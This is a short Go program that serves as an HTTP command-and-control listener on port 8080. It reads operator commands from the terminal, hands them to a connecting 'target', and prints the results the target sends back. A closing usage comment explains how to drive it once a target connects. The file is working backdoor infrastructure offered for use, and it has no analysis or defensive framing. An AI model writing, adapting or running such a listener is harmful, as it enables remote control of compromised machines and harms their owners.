package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

func main() {
	// start the main function
	http.HandleFunc("/", Starter)
	// listening on port 8080 of the localhost
	http.ListenAndServe(":8080", nil)
}

func Starter(w http.ResponseWriter, r *http.Request) {
	// getting the command
	var reader = bufio.NewReader(os.Stdin)

	text, _ := reader.ReadString('\n')
	// writes the command data
	fmt.Fprintf(w, text)
	defer r.Body.Close()
	// Recieving the Respone back from the client
	body, _ := ioutil.ReadAll(r.Body)
	fmt.Println(string(body))

}

//Usage := After the target is connected enter the command and press double  <ENTER> key//
